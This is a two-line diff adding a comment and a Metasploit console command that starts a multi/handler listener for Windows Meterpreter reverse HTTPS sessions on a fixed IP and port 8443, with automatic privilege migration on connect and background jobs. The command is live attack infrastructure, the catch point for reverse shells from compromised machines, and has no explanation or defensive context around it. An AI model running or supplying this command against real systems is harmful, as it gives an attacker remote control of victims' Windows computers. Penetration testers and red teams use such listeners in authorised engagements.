@@ -1,0 +1,2 @@
+# start a multi handler from a command prompt
+msfconsole -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_https; set LPORT 8443; set LHOST 134.232.232.55; set autorunscript post/windows/manage/priv_migrate;set exitonsession false; run -z -j"
